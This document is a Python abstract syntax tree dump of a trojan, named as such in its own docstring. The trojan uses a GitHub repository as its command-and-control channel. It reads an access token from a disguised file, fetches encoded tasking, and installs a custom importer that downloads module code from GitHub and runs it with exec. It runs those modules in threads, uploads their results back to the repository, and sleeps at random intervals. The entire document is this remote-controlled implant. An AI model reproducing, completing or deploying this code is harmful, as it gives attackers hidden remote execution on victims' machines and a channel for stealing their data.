"Module(body=[Import(names=[alias(name='base64')]), Import(names=[alias(name='github3')]), Import(names=[alias(name='importlib')]), Import(names=[alias(name='json')]), Import(names=[alias(name='random')]), Import(names=[alias(name='sys')]), Import(names=[alias(name='threading')]), Import(names=[alias(name='time')]), ImportFrom(module='datetime', names=[alias(name='datetime')], level=0), Assign(targets=[Name(id='repository', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Constant(value='Enter your Github repository: ')], keywords=[])), Assign(targets=[Name(id='username', ctx=Store())], value=Call(func=Name(id='input', ctx=Load()), args=[Constant(value='Enter your Github username: ')], keywords=[])), FunctionDef(name='github_connect', args=arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value='Github-aware trojan')), With(items=[withitem(context_expr=Call(func=Name(id='open', ctx=Load()), args=[Constant(value='weathertoday.txt')], keywords=[]), optional_vars=Name(id='f', ctx=Store()))], body=[Assign(targets=[Name(id='token', ctx=Store())], value=Call(func=Attribute(value=Name(id='f', ctx=Load()), attr='read', ctx=Load()), args=[], keywords=[])), Assign(targets=[Name(id='token', ctx=Store())], value=Call(func=Attribute(value=Name(id='token', ctx=Load()), attr='strip', ctx=Load()), args=[Constant(value='\\n')], keywords=[]))]), Assign(targets=[Name(id='repo', ctx=Store())], value=Name(id='repository', ctx=Load())), Assign(targets=[Name(id='user', ctx=Store())], value=Name(id='username', ctx=Load())), Assign(targets=[Name(id='sess', ctx=Store())], value=Call(func=Attribute(value=Name(id='github3', ctx=Load()), attr='login', ctx=Load()), args=[], keywords=[keyword(arg='token', value=Name(id='token', ctx=Load()))])), Return(value=Call(func=Attribute(value=Name(id='sess', ctx=Load()), attr='repository', ctx=Load()), args=[Name(id='user', ctx=Load()), Name(id='repository', ctx=Load())], keywords=[]))], decorator_list=[]), FunctionDef(name='get_file_contents', args=arguments(posonlyargs=[], args=[arg(arg='dirname'), arg(arg='module_name'), arg(arg='repo')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Expr(value=Constant(value=' Grabs files from the remote repository and reads the contents in locally.\\n        This allows us to read configuration options and the module source code')), Return(value=Attribute(value=Call(func=Attribute(value=Name(id='repo', ctx=Load()), attr='file_contents', ctx=Load()), args=[JoinedStr(values=[FormattedValue(value=Name(id='dirname', ctx=Load()), conversion=-1), Constant(value='/'), FormattedValue(value=Name(id='module_name', ctx=Load()), conversion=-1)])], keywords=[]), attr='content', ctx=Load()))], decorator_list=[]), ClassDef(name='Trojan', bases=[], keywords=[], body=[FunctionDef(name='__init__', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='id')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Store())], value=Name(id='id', ctx=Load())), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='config_file', ctx=Store())], value=JoinedStr(values=[FormattedValue(value=Name(id='id', ctx=Load()), conversion=-1), Constant(value='.json')])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='data_path', ctx=Store())], value=JoinedStr(values=[Constant(value='data/'), FormattedValue(value=Name(id='id', ctx=Load()), conversion=-1)])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Store())], value=Call(func=Name(id='github_connect', ctx=Load()), args=[], keywords=[]))], decorator_list=[]), FunctionDef(name='get_config', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='config_json', ctx=Store())], value=Call(func=Name(id='get_file_contents', ctx=Load()), args=[Constant(value='config'), Attribute(value=Name(id='self', ctx=Load()), attr='config_file', ctx=Load()), Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Load())], keywords=[])), Assign(targets=[Name(id='config', ctx=Store())], value=Call(func=Attribute(value=Name(id='json', ctx=Load()), attr='loads', ctx=Load()), args=[Call(func=Attribute(value=Name(id='base64', ctx=Load()), attr='b64decode', ctx=Load()), args=[Name(id='config_json', ctx=Load())], keywords=[])], keywords=[])), For(target=Name(id='task', ctx=Store()), iter=Name(id='config', ctx=Load()), body=[If(test=Compare(left=Subscript(value=Name(id='task', ctx=Load()), slice=Constant(value='module'), ctx=Load()), ops=[NotIn()], comparators=[Attribute(value=Name(id='sys', ctx=Load()), attr='modules', ctx=Load())]), body=[Expr(value=Call(func=Name(id='exec', ctx=Load()), args=[BinOp(left=Constant(value='import %s'), op=Mod(), right=Subscript(value=Name(id='task', ctx=Load()), slice=Constant(value='module'), ctx=Load()))], keywords=[]))], orelse=[])], orelse=[]), Return(value=Name(id='config', ctx=Load()))], decorator_list=[]), FunctionDef(name='module_runner', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='module')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='result', ctx=Store())], value=Call(func=Attribute(value=Subscript(value=Attribute(value=Name(id='sys', ctx=Load()), attr='modules', ctx=Load()), slice=Name(id='module', ctx=Load()), ctx=Load()), attr='run', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='store_module_result', ctx=Load()), args=[Name(id='result', ctx=Load())], keywords=[]))], decorator_list=[]), FunctionDef(name='store_module_result', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='data')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='message', ctx=Store())], value=Call(func=Attribute(value=Call(func=Attribute(value=Name(id='datetime', ctx=Load()), attr='now', ctx=Load()), args=[], keywords=[]), attr='isoformat', ctx=Load()), args=[], keywords=[])), Assign(targets=[Name(id='remote_path', ctx=Store())], value=JoinedStr(values=[Constant(value='data/'), FormattedValue(value=Attribute(value=Name(id='self', ctx=Load()), attr='id', ctx=Load()), conversion=-1), Constant(value='/'), FormattedValue(value=Name(id='message', ctx=Load()), conversion=-1), Constant(value='.data')])), Assign(targets=[Name(id='bindata', ctx=Store())], value=Call(func=Name(id='bytes', ctx=Load()), args=[BinOp(left=Constant(value='%r'), op=Mod(), right=Name(id='data', ctx=Load())), Constant(value='utf-8')], keywords=[])), Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Load()), attr='create_file', ctx=Load()), args=[Name(id='remote_path', ctx=Load()), Name(id='message', ctx=Load()), Call(func=Attribute(value=Name(id='base64', ctx=Load()), attr='b64encode', ctx=Load()), args=[Name(id='bindata', ctx=Load())], keywords=[])], keywords=[]))], decorator_list=[]), FunctionDef(name='run', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[While(test=Constant(value=True), body=[Assign(targets=[Name(id='config', ctx=Store())], value=Call(func=Attribute(value=Name(id='self', ctx=Load()), attr='get_config', ctx=Load()), args=[], keywords=[])), For(target=Name(id='task', ctx=Store()), iter=Name(id='config', ctx=Load()), body=[Assign(targets=[Name(id='thread', ctx=Store())], value=Call(func=Attribute(value=Name(id='threading', ctx=Load()), attr='Thread', ctx=Load()), args=[], keywords=[keyword(arg='target', value=Attribute(value=Name(id='self', ctx=Load()), attr='module_runner', ctx=Load())), keyword(arg='args', value=Tuple(elts=[Subscript(value=Name(id='task', ctx=Load()), slice=Constant(value='module'), ctx=Load())], ctx=Load()))])), Expr(value=Call(func=Attribute(value=Name(id='thread', ctx=Load()), attr='start', ctx=Load()), args=[], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='time', ctx=Load()), attr='sleep', ctx=Load()), args=[Call(func=Attribute(value=Name(id='random', ctx=Load()), attr='randint', ctx=Load()), args=[Constant(value=1), Constant(value=10)], keywords=[])], keywords=[]))], orelse=[]), Expr(value=Call(func=Attribute(value=Name(id='time', ctx=Load()), attr='sleep', ctx=Load()), args=[Call(func=Attribute(value=Name(id='random', ctx=Load()), attr='randint', ctx=Load()), args=[BinOp(left=Constant(value=30), op=Mult(), right=Constant(value=60)), BinOp(left=BinOp(left=Constant(value=3), op=Mult(), right=Constant(value=60)), op=Mult(), right=Constant(value=60))], keywords=[])], keywords=[]))], orelse=[])], decorator_list=[])], decorator_list=[]), ClassDef(name='GitImporter', bases=[], keywords=[], body=[Expr(value=Constant(value=' Every time the interpreter needs to load a module but is not available, it will use this class')), FunctionDef(name='__init__', args=arguments(posonlyargs=[], args=[arg(arg='self')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='current_module_code', ctx=Store())], value=Constant(value=''))], decorator_list=[]), FunctionDef(name='find_module', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='name'), arg(arg='path')], kwonlyargs=[], kw_defaults=[], defaults=[Constant(value=None)]), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[BinOp(left=Constant(value='Attempting to retrieve %s'), op=Mod(), right=Name(id='name', ctx=Load()))], keywords=[])), Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Store())], value=Call(func=Name(id='github_connect', ctx=Load()), args=[], keywords=[])), Assign(targets=[Name(id='new_library', ctx=Store())], value=Call(func=Name(id='get_file_contents', ctx=Load()), args=[Constant(value='modules'), JoinedStr(values=[FormattedValue(value=Name(id='name', ctx=Load()), conversion=-1), Constant(value='.py')]), Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Load())], keywords=[])), If(test=Compare(left=Name(id='new_library', ctx=Load()), ops=[IsNot()], comparators=[Constant(value=None)]), body=[Assign(targets=[Attribute(value=Name(id='self', ctx=Load()), attr='current_module_code', ctx=Store())], value=Call(func=Attribute(value=Name(id='base64', ctx=Load()), attr='b64decode', ctx=Load()), args=[Name(id='new_library', ctx=Load())], keywords=[])), Return(value=Name(id='self', ctx=Load()))], orelse=[])], decorator_list=[]), FunctionDef(name='load_module', args=arguments(posonlyargs=[], args=[arg(arg='self'), arg(arg='name')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Assign(targets=[Name(id='spec', ctx=Store())], value=Call(func=Attribute(value=Attribute(value=Name(id='importlib', ctx=Load()), attr='util', ctx=Load()), attr='spec_from_loader', ctx=Load()), args=[Name(id='name', ctx=Load())], keywords=[keyword(arg='loader', value=Constant(value=None)), keyword(arg='origin', value=Attribute(value=Attribute(value=Name(id='self', ctx=Load()), attr='repo', ctx=Load()), attr='git_url', ctx=Load()))])), Assign(targets=[Name(id='new_module', ctx=Store())], value=Call(func=Attribute(value=Attribute(value=Name(id='importlib', ctx=Load()), attr='util', ctx=Load()), attr='module_from_spec', ctx=Load()), args=[Name(id='spec', ctx=Load())], keywords=[])), Expr(value=Call(func=Name(id='exec', ctx=Load()), args=[Attribute(value=Name(id='self', ctx=Load()), attr='current_module_code', ctx=Load()), Attribute(value=Name(id='new_module', ctx=Load()), attr='__dict__', ctx=Load())], keywords=[])), Assign(targets=[Subscript(value=Attribute(value=Name(id='sys', ctx=Load()), attr='modules', ctx=Load()), slice=Attribute(value=Name(id='spec', ctx=Load()), attr='name', ctx=Load()), ctx=Store())], value=Name(id='new_module', ctx=Load())), Return(value=Name(id='new_module', ctx=Load()))], decorator_list=[])], decorator_list=[]), If(test=Compare(left=Name(id='__name__', ctx=Load()), ops=[Eq()], comparators=[Constant(value='__main__')]), body=[Expr(value=Call(func=Attribute(value=Attribute(value=Name(id='sys', ctx=Load()), attr='meta_path', ctx=Load()), attr='append', ctx=Load()), args=[Call(func=Name(id='GitImporter', ctx=Load()), args=[], keywords=[])], keywords=[])), Assign(targets=[Name(id='horsey', ctx=Store())], value=Call(func=Name(id='Trojan', ctx=Load()), args=[Constant(value='test')], keywords=[])), Expr(value=Call(func=Attribute(value=Name(id='horsey', ctx=Load()), attr='run', ctx=Load()), args=[], keywords=[]))], orelse=[])], type_ignores=[])"